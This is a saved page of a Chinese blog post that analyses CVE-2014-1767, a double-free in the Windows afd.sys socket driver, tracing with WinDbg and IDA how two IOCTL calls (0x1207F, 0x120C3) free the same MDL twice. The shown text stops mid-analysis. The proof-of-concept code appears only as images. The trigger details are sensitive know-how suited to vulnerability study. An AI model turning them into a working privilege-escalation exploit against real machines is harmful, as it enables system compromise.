<!DOCTYPE html>
<!-- saved from url=(0049)http://www.cnblogs.com/flycat-2016/p/5450275.html -->
<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园</title>
<link type="text/css" rel="stylesheet" href="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/blog-common.css">
<link id="MainCss" type="text/css" rel="stylesheet" href="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/bundle-LessIsMore.css">
<link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/bundle-LessIsMore-mobile.css">
<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/flycat-2016/rss">
<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/flycat-2016/rsd.xml">
<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/flycat-2016/wlwmanifest.xml">
<script async="" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/analytics.js.下载"></script><script src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/jquery-2.2.0.min.js.下载"></script>
<script type="text/javascript">var currentBlogApp = 'flycat-2016', cb_enable_mathjax=false;var isLogined=true;</script>
<script src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/blog-common.js.下载" type="text/javascript"></script>
<script charset="UTF-8" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/get"></script></head>
<body><script src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/base.js.下载"></script><div id="topbox"></div>
<a name="top"></a>

<div id="home">
<div id="header">
	<div id="blogTitle">
		
<!--done-->
<div class="title"><a id="Header1_HeaderTitle" class="headermaintitle" href="http://www.cnblogs.com/flycat-2016/">會飛的貓</a></div>
<div class="subtitle"></div>



		
	</div><!--end: blogTitle 博客的标题和副标题 -->
	<div id="navigator">
		
<ul id="navList">
<li id="nav_sitehome"><a id="blog_nav_sitehome" class="menu" href="http://www.cnblogs.com/">博客园</a></li>
<li id="nav_myhome"><a id="blog_nav_myhome" class="menu" href="http://www.cnblogs.com/flycat-2016/">首页</a></li>
<li id="nav_newpost"><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
<li id="nav_contact"><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/%E6%9C%83%E9%A3%9B%E7%9A%84%E8%B2%93">联系</a></li>
<li id="nav_rss"><a id="blog_nav_rss" class="menu" href="http://www.cnblogs.com/flycat-2016/rss">订阅</a>
<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="http://www.cnblogs.com/flycat-2016/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
<li id="nav_admin"><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
</ul>

		<div class="blogStats">
			
			<div id="blog_stats">
<!--done-->
随笔-18&nbsp;
文章-0&nbsp;
评论-3&nbsp;
</div>
			
		</div><!--end: blogStats -->
	</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->
<div id="main">
	<div id="mainContent">
	<div class="forFlow">
		
<div id="post_detail">
<!--done-->
<div id="topics">
	<div class="post">
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2" href="http://www.cnblogs.com/flycat-2016/p/5450275.html">CVE-2014-1767 漏洞分析(2015.1)</a>
		</h1>
		<div class="clear"></div>
		<div class="postBody">
			<div id="cnblogs_post_body" class="blogpost-body"><p style="text-align: center;"><span style="font-size: 20pt;"><strong><span style="font-family: Times New Roman;">CVE-2014-1767 </span><span style="font-family: 微软雅黑;">漏洞分析</span></strong></span></p>
<p style="text-align: left;"><span style="font-size: 18pt;"><strong><span style="font-family: 微软雅黑;">1. 简介</span></strong></span></p>
<p><span style="font-size: 10pt;"><span style="font-family: 微软雅黑;">该漏洞是由于</span><span style="font-family: Times New Roman;">Windows</span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">驱动在对系统内存的管理操作中，存在着悬垂指针的问题。在特定情况下攻击者可以通过该悬垂指针造成内存的</span><span style="font-family: Times New Roman;">double free</span><span style="font-family: 微软雅黑;">漏洞。</span></span></p>
<p><span style="font-family: 微软雅黑;"><span style="font-size: 10pt;">实现对漏洞的有效利用，</span>攻击者利用成功可导致权限提升。</span>afd.sys是内核用来管理socket的模块。</p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120056941-521000199.png" alt=""></p>
<p><span style="font-size: 10pt;"><span style="font-family: 微软雅黑;">影响的系统包括</span><span style="font-family: Times New Roman;">(32bit &amp; 64 bit)</span><span style="font-family: 微软雅黑;">：</span></span></p>
<p><span style="color: #2a2a2a; font-family: Times New Roman; font-size: 10pt;"><strong>　　&nbsp;Windows Server 2003 </strong></span></p>
<p style="margin-left: 25pt;"><span style="color: #2a2a2a; font-family: Times New Roman; font-size: 10pt;"><strong>Windows Vista </strong></span></p>
<p style="margin-left: 25pt;"><span style="color: #2a2a2a; font-family: Times New Roman; font-size: 10pt;"><strong>Windows Server 2008 </strong></span></p>
<p style="margin-left: 25pt;"><span style="color: #2a2a2a; font-family: Times New Roman; font-size: 10pt;"><strong>Windows 7 </strong></span></p>
<p style="margin-left: 25pt;"><span style="color: #2a2a2a; font-family: Times New Roman; font-size: 10pt;"><strong>Windows 8 &amp; Windows 8.1 </strong></span></p>
<p style="margin-left: 25pt;"><span style="color: #2a2a2a; font-family: Times New Roman; font-size: 10pt;"><strong>Windows Server 2012 </strong></span></p>
<p><span style="font-size: 10pt;"><span style="font-family: 微软雅黑;">测试环境：</span></span></p>
<p style="margin-left: 25pt;"><span style="font-family: Times New Roman; font-size: 10pt;">Win7 32bit </span></p>
<p><span style="font-size: 10pt;"><span style="font-family: 微软雅黑;">下面对漏洞成因做简单分析。</span></span></p>
<p><span style="color: red; font-size: 10pt;"><span style="font-family: 微软雅黑;">注：本文是以分析思路来写的，并不是总结性的。所以会有些绕，想了解漏洞成因，请直接看最后的流程分析。</span></span></p>
<p><span style="font-size: 18pt;"><strong><span style="font-family: 微软雅黑;">2.漏洞分析</span></strong></span></p>
<p><span style="font-family: &#39;Times New Roman&#39;; font-size: 14pt;"><strong>2.1 "POC" </strong></span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120057535-1926957792.png" alt=""></p>
<p><span style="font-size: 10pt;"><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">主要做了这么两件事：</span></span></p>
<p><span style="font-size: 10pt;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">初始化了一个本地</span><span style="font-family: Times New Roman;">socket</span><span style="font-family: 微软雅黑;">连接。</span></span></p>
<p><span style="font-size: 10pt;"><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">给这个</span><span style="font-family: Times New Roman;">socket</span><span style="font-family: 微软雅黑;">发送了两个控制码：</span><span style="font-family: Times New Roman;">0x1207F</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">0x120C3</span><span style="font-family: 微软雅黑;">。</span></span></p>
<p><span style="font-family: &#39;Times New Roman&#39;; font-size: 14pt;"><strong>2.2 First Crash </strong></span></p>
<p><span style="font-family: 微软雅黑;">将编译好的程序放在虚拟机中运行，触发漏洞之后的</span><span style="font-family: Times New Roman;">BSOD</span><span style="font-family: 微软雅黑;">：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120058175-1651279641.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">显示的信息为</span><span style="font-family: Times New Roman;">BAD_POOL_CALLER</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">BugCheck 0xc2</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">设置双机调试后，触发</span><span style="font-family: Times New Roman;">BSOD</span><span style="font-family: 微软雅黑;">，部分</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">输出的信息：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120058644-274645935.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">调用堆栈：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120059128-479937764.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">目前，我们可以知道：</span></p>
<p><span style="font-family: 微软雅黑;">出问题的是</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">模块，漏洞的类型为</span><span style="font-family: Times New Roman;">double free</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">free </span><span style="font-family: 微软雅黑;">的对象是</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">，并且发生崩溃时存在这样的调用关系：</span></p>
<p><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: Wingdings;">à</span><span style="font-family: Times New Roman;"> afd!AfdTliGetTpInfo</span><span style="font-family: Wingdings;">à</span><span style="font-family: Times New Roman;"> afd!AfdReturnTpInfo</span><span style="font-family: Wingdings;">à</span><span style="font-family: Times New Roman;">nt!IoFreeMdl </span></p>
<p><span style="font-family: &#39;Times New Roman&#39;; font-size: 14pt;"><strong>2.3 Second Crash? </strong></span></p>
<p><span style="font-family: 微软雅黑;">对</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">开启</span><span style="font-family: Times New Roman;">Special Pool</span><span style="font-family: 微软雅黑;">后，再次运行</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">，但是却没有发生崩溃，这有点奇怪。可是我们必须找到切入点，对问题</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">对象进行回溯，然后搞清楚整个流程，锁定问题。</span></p>
<p><span style="font-family: 微软雅黑;">未开启</span><span style="font-family: Times New Roman;">Special Pool</span><span style="font-family: 微软雅黑;">时，我们知道最后崩溃时的函数调用关系，或许可以对</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">下断点，若此时也调用了该函数，可能会获得一些信息。但首先我们要搞清楚</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">向</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">发送的两个控制码所对应的内核函数。</span></p>
<p><span style="font-family: 微软雅黑;">要找到这个对应关系，有这样的调试技巧：用户层的</span><span style="font-family: Times New Roman;">IoControl</span><span style="font-family: 微软雅黑;">消息到都会被内核包装成</span><span style="font-family: Times New Roman;">IRP</span><span style="font-family: 微软雅黑;">包，发送给对应驱动的</span><span style="font-family: Times New Roman;">IRP_MJ_DEVICE_CONTROL</span><span style="font-family: 微软雅黑;">例程来处理，</span><span style="font-family: Times New Roman;">IRP_MJ_DEVICE_CONTROL</span><span style="font-family: 微软雅黑;">例程会根据控制码来选择对应的函数。</span></p>
<p><span style="font-family: 微软雅黑;">感谢</span><span style="font-family: Times New Roman;">Windbg</span><span style="font-family: 微软雅黑;">为我们提供了这样的功能：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120059785-318854944.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">这样就可以得到</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">对应的</span><span style="font-family: Times New Roman;">IRP_MJ_DEVICE_CONTROL</span><span style="font-family: 微软雅黑;">例程为</span><span style="font-family: Times New Roman;">afd!AfdDispatchDeviceControl</span><span style="font-family: 微软雅黑;">，利用</span><span style="font-family: Times New Roman;">IDA</span><span style="font-family: 微软雅黑;">对该函数简单分析后，其大致流程如下：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120100347-1097263581.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">设置如下两个断点：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120100738-1402769642.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">再次运行</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">，便可以得到两个控制码所对应的内核函数：</span></p>
<p>0x1207F：afd!AfdTransmitFile</p>
<p>0x120C3：afd!AfdTransmitPackets</p>
<p><span style="font-family: 微软雅黑;">接下来对上面提到的</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">下断点，此时对</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">仍然开启了</span><span style="font-family: Times New Roman;">Special pool</span><span style="font-family: 微软雅黑;">。看看有啥惊喜。</span></p>
<p><span style="font-family: 微软雅黑;">运行</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">，待其断下来之后，对释放的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">进行跟踪：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120101300-47970014.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">咦，此时调用</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">的并不是</span><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: 微软雅黑;">，而是</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">。好像还不能明白发生了什么，先记录下此时</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">分配和释放的相关函数调用关系：</span></p>
<p><span style="font-family: 微软雅黑;">分配：</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile+0x170</span><span style="font-family: Wingdings;">à</span> <span style="font-family: Times New Roman;">nt!VerifierIoAllocateMdl </span></p>
<p><span style="font-family: 微软雅黑;">释放：</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile+0x5a3</span><span style="font-family: Wingdings;">à</span> <span style="font-family: Times New Roman;">afd!AfdReturnTpInfo+0xadx</span><span style="font-family: Wingdings;">à</span> <span style="font-family: Times New Roman;">nt!IoFreeMdl </span></p>
<p><span style="font-family: Times New Roman;">nt!VerifierIoAllocateMdl</span><span style="font-family: 微软雅黑;">这个函数有点奇怪，正常情况都是调用</span><span style="font-family: Times New Roman;">nt!IoAllocateMdl</span><span style="font-family: 微软雅黑;">来分配</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">的空间，</span><span style="font-family: Times New Roman;">IDA</span><span style="font-family: 微软雅黑;">中此时也是调用的</span><span style="font-family: Times New Roman;">IoAllocateMdl</span><span style="font-family: 微软雅黑;">，这是否是导致开启</span><span style="font-family: Times New Roman;">special pool</span><span style="font-family: 微软雅黑;">后不崩溃的原因？这个问题还有待考证。</span></p>
<p><span style="font-family: 微软雅黑;">接着再看，在函数</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">内，</span><span style="font-family: Times New Roman;">Mdl=[edi+0ch]</span><span style="font-family: 微软雅黑;">，所以利用同样的方法，在</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">中查看</span><span style="font-family: Times New Roman;">edi</span><span style="font-family: 微软雅黑;">的分配释放记录：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120102066-439387585.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">记录下关于</span><span style="font-family: Times New Roman;">edi</span><span style="font-family: 微软雅黑;">的函数的调用关系：</span></p>
<p><span style="font-family: Times New Roman;">AfdTransmitFile</span><span style="font-family: Wingdings;">à</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: Wingdings;">à</span><span style="font-family: Times New Roman;">ExAllocateFromNPagedLookasideList</span><span style="font-family: Wingdings;">à</span><span style="font-family: Times New Roman;">AfdAllocateTpInfo </span></p>
<p><span style="font-family: 微软雅黑;">而在函数</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">中，</span><span style="font-family: Times New Roman;">edi=[esi+20h]</span><span style="font-family: 微软雅黑;">，同样的方法：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120102503-260248986.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">咦，怎么会和</span><span style="font-family: Times New Roman;">edi</span><span style="font-family: 微软雅黑;">的结果一样？根据此时的函数调用，来看看</span><span style="font-family: Times New Roman;">afd!AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">这个函数：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120102894-799784821.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">从这段</span><span style="font-family: Times New Roman;">IDA</span><span style="font-family: 微软雅黑;">截图，根据微软的匈牙利命名法，可以知道函数</span><span style="font-family: Times New Roman;">afd! AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">中的</span><span style="font-family: Times New Roman;">edi</span><span style="font-family: 微软雅黑;">为</span><span style="font-family: Times New Roman;">TpInfoElement</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">esi=TpInfo</span><span style="font-family: 微软雅黑;">。并且</span><span style="font-family: Times New Roman;">TpInfoElementArray=*(DWORD*)(TpInfo+20h)</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">sizeof(TpInfoElement)=0x18</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">稍作总结一下我们所知道的：</span><span style="font-family: Times New Roman;">IoControl=0x1207F</span><span style="font-family: 微软雅黑;">时，会调用</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">会调用</span><span style="font-family: Times New Roman;">afd!AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">分配一个</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">，接着会调用</span><span style="font-family: Times New Roman;">nt!IoAllocateMdl</span><span style="font-family: 微软雅黑;">分配一个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">，然后会从</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构中得到这个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">，并释放掉。</span></p>
<p><span style="font-family: 微软雅黑;">接着用</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">使用系统继续运行，</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">再也没有断下来，有一点忧伤。再次查看崩溃时的函数调用关系，将断点的位置提前到</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">开始的时候。然后</span><span style="font-family: Times New Roman;">IoControl=0x120C3</span><span style="font-family: 微软雅黑;">时，断点断下来后，利用</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">跟踪此时的</span><span style="font-family: Times New Roman;">esi</span><span style="font-family: 微软雅黑;">：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120103425-20637235.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">这个调用关系看起来十分的眼熟，和</span><span style="font-family: Times New Roman;">IoControl=0x1207F</span><span style="font-family: 微软雅黑;">时除了对应的内核函数不同，其他调用简直一模一样！那么我们来看看此时是如果避开了释放</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">的流程。</span></p>
<p><span style="font-family: 微软雅黑;">利用</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">单步跟踪一下，发现其在</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo+0x69</span><span style="font-family: 微软雅黑;">处，由于</span><span style="font-family: Times New Roman;">[esi+28h]=0</span><span style="font-family: 微软雅黑;">，跳转到另一条不执行释放</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">的流程了。</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120103894-2146368649.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">而此时</span><span style="font-family: Times New Roman;">esi=TpInfo</span><span style="font-family: 微软雅黑;">，我们可以猜测</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构另一个成员：</span><span style="font-family: Times New Roman;">TpInfo+28h=TpInfoElementCount</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">好了，现在对整个流程有一个粗略的了解了。再回看一下漏洞的描述，</span><span style="font-family: Times New Roman;">"Mdl double free"</span><span style="font-family: 微软雅黑;">，那么可以大胆的猜测一下：</span><span style="font-family: Times New Roman;">double free </span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">就是</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">所创建的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">！</span></p>
<p><span style="font-size: 14pt;"><strong><span style="font-family: Times New Roman;">2.4&nbsp;</span><span style="font-family: 微软雅黑;">大胆的假设</span></strong></span></p>
<p><span style="font-family: 微软雅黑;">关闭</span><span style="font-family: Times New Roman;">special pool</span><span style="font-family: 微软雅黑;">，设置如下两个断点：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120104410-1243386177.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">记录下</span><span style="font-family: Times New Roman;">afd! AfdTransmitFile</span><span style="font-family: 微软雅黑;">所创建的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">的地址，和最后调用</span><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: 微软雅黑;">时释放</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">地址做比较。</span></p>
<p><span style="font-family: 微软雅黑;">我们惊奇的发现，这两个地址是一样的！也就是最后</span><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: 微软雅黑;">流程中释放的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">正是</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">所创建的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">！</span></p>
<p><span style="font-family: 微软雅黑;">这样我们对整个流程又有了进一步的了解：</span></p>
<p><span style="font-family: Times New Roman;">IoControl=0x1207F</span><span style="font-family: 微软雅黑;">，对应的内核函数</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">会创建</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构，分配一个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">并将地址存入到</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构的</span><span style="font-family: Times New Roman;">TpInfoElementArray</span><span style="font-family: 微软雅黑;">中，接着其会调用</span><span style="font-family: Times New Roman;">afd!AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">释放掉</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: Times New Roman;">IoControl=0x120C3</span><span style="font-family: 微软雅黑;">，对应的内核函数</span><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: 微软雅黑;">会从</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">取出</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">，而这个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">正好是</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">已经释放掉了的，此时</span><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: 微软雅黑;">会尝试对其进行第二次释放。然后就</span><span style="font-family: Times New Roman;">BSOD</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">目前有一个大大的疑问：为什么</span><span style="font-family: Times New Roman;">afd!AfdTransmitPackets</span><span style="font-family: 微软雅黑;">流程中释放的就那么巧的就是</span><span style="font-family: Times New Roman;">afd!AfdTransmitFile</span><span style="font-family: 微软雅黑;">所创建的那个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">？内核中</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">的分配和释放时刻都在发生，为何会恰好得到那一块</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">？</span></p>
<p><span style="font-family: 微软雅黑;">看来，得要去分析一下</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">分配和释放相关的一些东西了。</span></p>
<p><span style="font-size: 14pt;"><strong><span style="font-family: Times New Roman;">2.5</span><span style="font-family: 微软雅黑;">一些函数</span></strong></span></p>
<p><span style="font-family: 微软雅黑;">通过上面的分析，我们知道了一些和</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">分配和释放相关的函数：</span></p>
<p><span style="font-family: Times New Roman;">ExAllocateFromNPagedLookasideList</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">AfdAllocateTpInfo</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">ExFreeToNPagedLookasideList</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">AfdTransmitFile</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">AfdTransmitPackets</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">结合静态和动态分析，将</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">流程走的这个几个函数分析出来，特别留意和</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">的关系。这个没啥好说的了，就直接把逆出来的伪</span><span style="font-family: Times New Roman;">C</span><span style="font-family: 微软雅黑;">代码贴出来，然后加以解释了。</span></p>
<p><span style="font-family: 微软雅黑;">再说第一个函数之前，介绍一下</span><span style="font-family: Times New Roman;">IRP</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">IO_Stack_Location</span><span style="font-family: 微软雅黑;">，比如</span><span style="font-family: Times New Roman;">IOControl=0x120C3</span><span style="font-family: 微软雅黑;">时：</span></p>
<p><span style="font-family: 微软雅黑;">函数</span><span style="font-family: Times New Roman;">AfdTransmitPackets</span><span style="font-family: 微软雅黑;">开始时候的</span><span style="font-family: Times New Roman;">ecx</span><span style="font-family: 微软雅黑;">就是</span><span style="font-family: Times New Roman;">IRP</span><span style="font-family: 微软雅黑;">：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120104863-2088752860.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">红框内的值是否看起来有一点眼熟？回头看看</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">，这正是第二次</span><span style="font-family: Times New Roman;">DeviceIoControl</span><span style="font-family: 微软雅黑;">的部分参数。</span><span style="font-family: Times New Roman;">IRP</span><span style="font-family: 微软雅黑;">的结构微软一直藏着掖着的，公开的部分结构也比较模糊。</span></p>
<p><span style="font-family: Times New Roman;">IO_Stack_Location</span><span style="font-family: 微软雅黑;">位置</span><span style="font-family: Times New Roman;">IRP+60h</span><span style="font-family: 微软雅黑;">位置，其结构很简单但是因为有一个</span><span style="font-family: Times New Roman;">union</span><span style="font-family: 微软雅黑;">结构的存在，显得很多，此时</span><span style="font-family: Times New Roman;">Parameters</span><span style="font-family: 微软雅黑;">对应的是</span><span style="font-family: Times New Roman;">DeviceIoControl</span><span style="font-family: 微软雅黑;">，结构如下：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120105285-1813557857.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">此时</span><span style="font-family: Times New Roman;">IO_Stack_Location</span><span style="font-family: 微软雅黑;">的内存：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120105707-991419323.png" alt=""></p>
